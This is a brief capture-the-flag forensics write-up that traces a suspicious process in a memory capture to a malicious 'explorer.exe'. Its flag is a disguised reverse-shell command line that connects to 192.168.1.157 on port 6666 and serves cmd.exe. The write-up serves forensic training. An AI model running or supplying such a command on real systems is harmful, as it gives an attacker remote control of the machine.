# Commands
![](../../assets/forensics/commands_1.png)

[Zip File](https://drive.google.com/file/d/1porBmluAvOp9qaK-lRJf4NqYysfd9gxw/view?usp=sharing) 
Please before look to [Captured Memories](Forensics/Captured%20Memories/index.md)
From [cmdline output](../../assets/forensics/cmdline.txt) we can easily  see 
process `3100` use process `5448`'s  malicious explorer.exe.
![](../../assets/forensics/commands_2.png)


Flag: `flag{explorer.exe  192.168.1.157 6666 -e cmd.exe}` 